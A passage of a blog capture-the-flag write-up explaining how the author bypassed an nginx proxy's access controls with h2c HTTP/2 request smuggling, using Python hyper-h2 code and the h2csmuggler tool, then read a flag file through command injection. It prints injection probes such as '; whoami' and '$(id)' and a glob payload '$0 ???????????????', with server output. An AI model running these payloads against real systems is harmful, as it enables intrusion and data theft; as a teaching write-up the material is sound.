</span></span><span class=line><span class=cl>        <span class=sa>b</span><span class=s2>&#34;Accept-Language: en</span><span class=se>\r\n</span><span class=s2>&#34;</span> <span class=o>+</span>
</span></span><span class=line><span class=cl>        <span class=sa>b</span><span class=s2>&#34;Upgrade: h2c</span><span class=se>\r\n</span><span class=s2>&#34;</span> <span class=o>+</span>
</span></span><span class=line><span class=cl>        <span class=sa>b</span><span class=s2>&#34;HTTP2-Settings: &#34;</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;AAMAAABkAARAAAAAAAIAAAAA&#34;</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\r\n</span><span class=s2>&#34;</span> <span class=o>+</span>
</span></span><span class=line><span class=cl>        <span class=sa>b</span><span class=s2>&#34;Connection: Upgrade, HTTP2-Settings</span><span class=se>\r\n</span><span class=s2>&#34;</span> <span class=o>+</span>
</span></span><span class=line><span class=cl>        <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\r\n</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>    <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>connection</span><span class=o>.</span><span class=n>sendall</span><span class=p>(</span><span class=n>request</span><span class=p>)</span>
</span></span></code></pre></div><ul><li>The <code>HTTP2-Settings</code> headers defines the terms by which client and server communicate (max concurrent streams&mldr;etc).</li><li><code>Connection: Upgrade, HTTP2-Settings</code> tells the server that the request wants to upgrade to HTTP/2 and that it
wants to use the HTTP2-Settings for upgrade negotiation.</li></ul><h4 id=3-creating-h2-connection-object--sending-smuggled-request><code>3. Creating H2 Connection Object & Sending Smuggled Request</code><a hidden class=anchor aria-hidden=true href=#3-creating-h2-connection-object--sending-smuggled-request>#</a></h4><p>Assuming the latter request gave a <code>101 Switching Protocols</code> status code. Let&rsquo;s now
send our HTTP/2 requests.</p><p>HTTP/2 is a binary framed protocol. In simple terms, it doesn&rsquo;t depend on raw text
data like Http/1.x do (\r\n to be precise). So data is encapsulated in clear binary
format. The object that handles this encapsulation is <code>H2Connection</code>.</p><p>It’s like a translator: you tell it what you want to say (e.g., send a request), and it gives you raw bytes to send over the wire.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>h2.connection</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># This doesn&#39;t create a network connection</span>
</span></span><span class=line><span class=cl><span class=c1># h2_connection only gives binary data that WE OURSELVES send through the original tcp connection</span>
</span></span><span class=line><span class=cl><span class=n>h2_connection</span> <span class=o>=</span> <span class=n>h2</span><span class=o>.</span><span class=n>connection</span><span class=o>.</span><span class=n>H2Connection</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>sendSmuggledRequest</span><span class=p>(</span><span class=n>h2_connection</span><span class=p>,</span> <span class=n>connection</span><span class=p>,</span> <span class=n>args</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>stream_id</span> <span class=o>=</span> <span class=n>h2_connection</span><span class=o>.</span><span class=n>get_next_available_stream_id</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>smuggled_request_headers</span> <span class=o>=</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=s1>&#39;:method&#39;</span><span class=p>,</span> <span class=s1>&#39;GET&#39;</span><span class=p>),</span>
</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=s1>&#39;:scheme&#39;</span><span class=p>,</span> <span class=s1>&#39;http&#39;</span><span class=p>),</span>
</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=s1>&#39;:authority&#39;</span><span class=p>,</span> <span class=s1>&#39;localhost&#39;</span><span class=p>),</span>
</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=s1>&#39;:path&#39;</span><span class=p>,</span> <span class=s1>&#39;/api/noopsy&#39;</span><span class=p>),</span> <span class=c1># the bypassed path</span>
</span></span><span class=line><span class=cl>    <span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=c1># Prepare the headers from python&#39;s format into binary format</span>
</span></span><span class=line><span class=cl>    <span class=n>h2_connection</span><span class=o>.</span><span class=n>send_headers</span><span class=p>(</span><span class=n>stream_id</span><span class=p>,</span> <span class=n>smuggled_request_headers</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># Actually send the data</span>
</span></span><span class=line><span class=cl>    <span class=n>connection</span><span class=o>.</span><span class=n>sendall</span><span class=p>(</span><span class=n>h2_connection</span><span class=o>.</span><span class=n>data_to_send</span><span class=p>())</span>
</span></span></code></pre></div><p>Now that we sent the HTTP/2 request, we need to receive the response.</p><p>When you communicate over HTTP/2 using the h2 library, the server sends data and signals as part of the protocol,
which might include things like:</p><ul><li>Incoming requests</li><li>Responses</li><li>Stream lifecycle changes</li><li>Flow control updates</li><li>Server push notifications</li><li>And more&mldr;</li></ul><p>The h2 library abstracts these incoming signals into <strong>“events.”</strong></p><p>To handle those &ldquo;events&rdquo;, we have to receive raw data from the network and process it
as follows:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># get the data using socket.recv()</span>
</span></span><span class=line><span class=cl><span class=n>events</span> <span class=o>=</span> <span class=n>getData</span><span class=p>(</span><span class=n>h2_connection</span><span class=p>,</span> <span class=n>connection</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>handle_events</span><span class=p>(</span><span class=n>events</span><span class=p>,</span> <span class=n>isVerbose</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>event</span> <span class=ow>in</span> <span class=n>events</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=nb>isinstance</span><span class=p>(</span><span class=n>event</span><span class=p>,</span> <span class=n>ResponseReceived</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=c1># Handle response headers</span>
</span></span><span class=line><span class=cl>            <span class=k>for</span> <span class=n>name</span><span class=p>,</span> <span class=n>value</span> <span class=ow>in</span> <span class=n>event</span><span class=o>.</span><span class=n>headers</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>name</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>)</span><span class=si>}</span><span class=s2>: </span><span class=si>{</span><span class=n>value</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>)</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=nb>isinstance</span><span class=p>(</span><span class=n>event</span><span class=p>,</span> <span class=n>DataReceived</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=c1># Handle response body data</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=n>event</span><span class=o>.</span><span class=n>data</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>,</span> <span class=s1>&#39;replace&#39;</span><span class=p>))</span>
</span></span></code></pre></div><h3 id=combining-everything-together>Combining Everything Together<a hidden class=anchor aria-hidden=true href=#combining-everything-together>#</a></h3><p>Now that we know how <a href=bishopfox.com/blog/h2c-smuggling-request>Jake Miller&rsquo;s</a> PoC works, we can use it to bypass nginx&rsquo;s
access controls as follows:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python3 h2csmuggler.py -x <span class=s2>&#34;https://nopsctf-&lt;INSTANCE_ID&gt;-plotwist-1.chals.io/api/lordhttp&#34;</span> <span class=s2>&#34;http://localhost/api/noopsy&#34;</span>
</span></span></code></pre></div><p>Where:</p><ul><li><code>-x, --proxy PROXY</code> is the proxy server to try to bypass</li><li><code>http://localhost/api/noopsy</code> is the smuggled URL</li></ul><p>The command as it is will send a GET request to <code>/api/lordhttp</code> and <code>/api/noopsy</code>,
but the application accepts POST requests to both, does it accept GET requests? Let&rsquo;s try:</p><blockquote><p>We could&rsquo;ve send some OPTIONS/HEAD methods to verify that the server actually
sends an <code>allow: GET</code> header, but testing it this way is faster.</p></blockquote><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>h2csmuggler on  master <span class=o>[</span>!<span class=o>]</span> via 🐹 via 🐍 v3.13.3
</span></span><span class=line><span class=cl>➜ python3 h2csmuggler.py -x <span class=s2>&#34;https://nopsctf-dcdefb599276-plotwist-1.chals.io/api/lordhttp&#34;</span> <span class=s2>&#34;http://localhost/api/noopsy&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>INFO<span class=o>]</span> h2c stream established successfully.
</span></span><span class=line><span class=cl>:status: <span class=m>200</span>
</span></span><span class=line><span class=cl>content-length: <span class=m>46</span>
</span></span><span class=line><span class=cl>content-type: application/json
</span></span><span class=line><span class=cl>date: Wed, <span class=m>04</span> Jun <span class=m>2025</span> 13:12:22 GMT
</span></span><span class=line><span class=cl>server: hypercorn-h2
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>{</span><span class=s2>&#34;msg&#34;</span>:<span class=s2>&#34;Hello from the other side, Lord HTTP&#34;</span><span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>nopsctf-dcdefb599276-plotwist-1.chals.io/api/lordhttp - <span class=m>200</span> - <span class=m>46</span>
</span></span><span class=line><span class=cl><span class=o>[</span>INFO<span class=o>]</span> Requesting - /api/noopsy
</span></span><span class=line><span class=cl>:status: <span class=m>200</span>
</span></span><span class=line><span class=cl>content-length: <span class=m>100</span>
</span></span><span class=line><span class=cl>content-type: application/json
</span></span><span class=line><span class=cl>date: Wed, <span class=m>04</span> Jun <span class=m>2025</span> 13:12:23 GMT
</span></span><span class=line><span class=cl>server: hypercorn-h2
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>{</span><span class=s2>&#34;msg&#34;</span>:<span class=s2>&#34;Got a secret, can you keep it? Well this one, I&#39;ll save it in the secret_flag.txt file ^.^&#34;</span><span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>localhost/api/noopsy - <span class=m>200</span> - <span class=m>100</span>
</span></span></code></pre></div><p>There we go~ Sto is kind enough to save the flag in a <code>secret_flag.txt</code> file, all
we have to do is read that flag!</p><h3 id=getting-the-flag-or-so-i-think>Getting the Flag (or so I Think?)<a hidden class=anchor aria-hidden=true href=#getting-the-flag-or-so-i-think>#</a></h3><p>We now know <code>/api/noopsy</code> accepts <strong>POST</strong> requests. We test for <a href=https://portswigger.net/web-security/os-command-injection>command injection</a> using:</p><ul><li><code>; whoami</code></li><li><code>| id</code></li><li><code>&& uname -a</code></li><li><code>$(id)</code></li></ul><p>But&mldr; Nothing worked :(</p><p>The server responds with a <strong>riddle</strong>.</p><p><img alt="sto riddle" loading=lazy src=/blog/images/2025-06-04-14-21-05.png></p><p>Let’s decode it:</p><ol><li>Money -> This could mean <code>$</code>, which can refer to environment variables</li><li>Talk in dollars or digits, or don’t even try -> allowed characters are <code>$</code>, <code>[0-9]</code></li><li>Got a question? I’ll answer you away -> maybe even <code>?</code> is allowed?</li></ol><p>Mhmmm, how can we read a file using only those character: <code>$</code>, <code>[0-9]</code> and <code>?</code></p><hr><p>It turns out, there is quite a creative way to solve this, but it all depends on the
same concept: <a href=https://www.gnu.org/software/bash/manual/html_node/Shell-Expansions.html>shell expansion</a></p><h3 id=shell-expansion-the-real-deal>Shell Expansion (the Real Deal)<a hidden class=anchor aria-hidden=true href=#shell-expansion-the-real-deal>#</a></h3><p>When you&rsquo;re working in your shell, and type something like: <code>rm *</code>, you might think
that the <code>rm</code> command treats the character <code>*</code> differently and removes every file
in the current directory. However, you&rsquo;d be wrong!</p><p>Your shell <strong>expands</strong> <code>*</code> and replaces it with every file inside the current directory,
so something like:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>rm *
</span></span></code></pre></div><p>becomes:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>rm file1 file2 file3...etc
</span></span></code></pre></div><p>BEFORE the command executes.</p><p>We can use this trick to execute commands AND supply filenames without needing to actually
type letters in the terminal. More specifically, we can do this:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$0</span> ???????????????
</span></span></code></pre></div><p>Where:</p><ul><li><code>$0</code> -> holds the name of the script or command being executed. The one I&rsquo;m <strong>TRUSTING</strong>
will give the flag based on the phrase: <em><strong>&ldquo;I’ll answer you away&rdquo;</strong></em></li><li><code>?</code> matches exactly one character -> 15 of them match <code>secret_flag.txt</code></li></ul><p>Putting this all together (with some grep magic of course), we end up with:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>➜ python3 h2csmuggler.py -x <span class=s2>&#34;https://nopsctf-dcdefb599276-plotwist-1.chals.io/api/lordhttp&#34;</span> -XPOST -d <span class=s1>&#39;{&#34;letter&#34;: &#34;$0 ???????????????&#34;}&#39;</span> <span class=s2>&#34;http://localhost/api/noopsy&#34;</span> <span class=p>|</span> grep -oP N0PS<span class=o>{</span>.*?<span class=o>}</span>
</span></span><span class=line><span class=cl>N0PS<span class=o>{</span>4nD_I_FE3l_50m37h1nG_5o_wR0nG_d01nG_7h3_r18h7_7h1nG<span class=o>}</span>
</span></span></code></pre></div><p>Flag is: <code>N0PS{4nD_I_FE3l_50m37h1nG_5o_wR0nG_d01nG_7h3_r18h7_7h1nG}</code></p><p><img alt=Primeagen loading=lazy src=https://media1.tenor.com/m/hYU0XdvEzmAAAAAC/theprimeagen-primeagen.gif></p><h2 id=conclusions>Conclusions<a hidden class=anchor aria-hidden=true href=#conclusions>#</a></h2><ul><li>The challenge exploited an h2c (HTTP/2 cleartext) request smuggling vulnerability to bypass NGINX access controls.</li><li>HTTP/2 upgrade allowed sending unfiltered requests directly to the backend, circumventing proxy restrictions.</li><li>Custom Python client using <code>hyper-h2</code> was needed due to limitations with standard HTTP/2 tools over TLS.</li><li>The flag retrieval required understanding shell expansion and limited input filtering to craft a valid command injection payload.</li><li>The writeup highlights the importance of protocol-level nuances in web security and proxy behavior.</li></ul><h2 id=references>References<a hidden class=anchor aria-hidden=true href=#references>#</a></h2><ol><li><p><strong>Bishop Fox – H2C Smuggling Explained</strong></p><ul><li>Blog post: <a href=https://bishopfox.com/blog/h2c-smuggling-request>H2C Smuggling Request</a></li><li>Video explainer: <a href="https://www.youtube.com/watch?v=PFllH0QccCs">YouTube: &ldquo;Smuggling HTTP Requests with H2C&rdquo;</a></li></ul></li><li><p><strong>RFC 7540 – HTTP/2 Specification</strong></p><ul><li>Multiplexing and stream behavior: <a href=https://datatracker.ietf.org/doc/html/rfc7540#section-5>RFC 7540 §5 – Streams and Multiplexing</a></li></ul></li><li><p><strong>H2C Upgrade Mechanics</strong></p><ul><li>Video: <a href="https://www.youtube.com/watch?v=TOm3bFKotbU">YouTube: &ldquo;H2C Cleartext HTTP/2 Exploits&rdquo;</a></li><li>Python library docs: <a href=https://python-hyper.org/projects/hyper-h2/en/stable/basic-usage.html>hyper-h2 Usage Guide</a></li><li>Shows how to manually craft and send HTTP/2 requests over cleartext using <code>hyper-h2</code>, since standard clients like <code>curl</code> block such behavior due to spec violations.</li></ul></li><li><p><a href="https://www.youtube.com/watch?v=AlE5X1NlHgg&amp;list=PLQnljOFTspQW4yHuqp_Opv853-G_wAiH-"><strong>Transport Layer Security, TLS 1.2 and 1.3 (Explained by Example)</strong></a></p></li></ol></div><footer class=post-footer><ul class=post-tags><li><a href=https://hxuu.github.io/blog/tags/ctf/>Ctf</a></li><li><a href=https://hxuu.github.io/blog/tags/write-up/>Write-Up</a></li><li><a href=https://hxuu.github.io/blog/tags/nops/>Nops</a></li></ul><nav class=paginav><a class=next href=https://hxuu.github.io/blog/ctf/n0ps25/casinops/><span class=title>Next »</span><br><span>N0PS25: Writeup for Web/CasinOps</span></a></nav><ul class=share-buttons><li><a target=_blank rel="noopener noreferrer" aria-label="share N0PS25: Writeup for Web/Plotwist on x" href="https://x.com/intent/tweet/?text=N0PS25%3a%20Writeup%20for%20Web%2fPlotwist&amp;url=https%3a%2f%2fhxuu.github.io%2fblog%2fctf%2fn0ps25%2fplotwist%2f&amp;hashtags=ctf%2cwrite-up%2cnops"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M512 62.554V449.446C512 483.97 483.97 512 449.446 512H62.554C28.03 512 0 483.97.0 449.446V62.554C0 28.03 28.029.0 62.554.0H449.446C483.971.0 512 28.03 512 62.554zM269.951 190.75 182.567 75.216H56L207.216 272.95 63.9 436.783h61.366L235.9 310.383l96.667 126.4H456L298.367 228.367l134-153.151H371.033zM127.633 110h36.468l219.38 290.065H349.5z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share N0PS25: Writeup for Web/Plotwist on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fhxuu.github.io%2fblog%2fctf%2fn0ps25%2fplotwist%2f&amp;title=N0PS25%3a%20Writeup%20for%20Web%2fPlotwist&amp;summary=N0PS25%3a%20Writeup%20for%20Web%2fPlotwist&amp;source=https%3a%2f%2fhxuu.github.io%2fblog%2fctf%2fn0ps25%2fplotwist%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share N0PS25: Writeup for Web/Plotwist on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fhxuu.github.io%2fblog%2fctf%2fn0ps25%2fplotwist%2f&title=N0PS25%3a%20Writeup%20for%20Web%2fPlotwist"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share N0PS25: Writeup for Web/Plotwist on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fhxuu.github.io%2fblog%2fctf%2fn0ps25%2fplotwist%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share N0PS25: Writeup for Web/Plotwist on whatsapp" href="https://api.whatsapp.com/send?text=N0PS25%3a%20Writeup%20for%20Web%2fPlotwist%20-%20https%3a%2f%2fhxuu.github.io%2fblog%2fctf%2fn0ps25%2fplotwist%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share N0PS25: Writeup for Web/Plotwist on telegram" href="https://telegram.me/share/url?text=N0PS25%3a%20Writeup%20for%20Web%2fPlotwist&amp;url=https%3a%2f%2fhxuu.github.io%2fblog%2fctf%2fn0ps25%2fplotwist%2f"><svg viewBox="2 2 28 28" height="30" width="30" fill="currentcolor"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share N0PS25: Writeup for Web/Plotwist on ycombinator" href="https://news.ycombinator.com/submitlink?t=N0PS25%3a%20Writeup%20for%20Web%2fPlotwist&u=https%3a%2f%2fhxuu.github.io%2fblog%2fctf%2fn0ps25%2fplotwist%2f"><svg width="30" height="30" viewBox="0 0 512 512" fill="currentcolor" xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape"><path d="M449.446.0C483.971.0 512 28.03 512 62.554V449.446C512 483.97 483.97 512 449.446 512H62.554C28.03 512 0 483.97.0 449.446V62.554C0 28.03 28.029.0 62.554.0H449.446zM183.8767 87.9921h-62.034L230.6673 292.4508V424.0079h50.6655V292.4508L390.1575 87.9921H328.1233L256 238.2489z"/></svg></a></li></ul></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://hxuu.github.io/blog/>hxuu</a></span> ·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>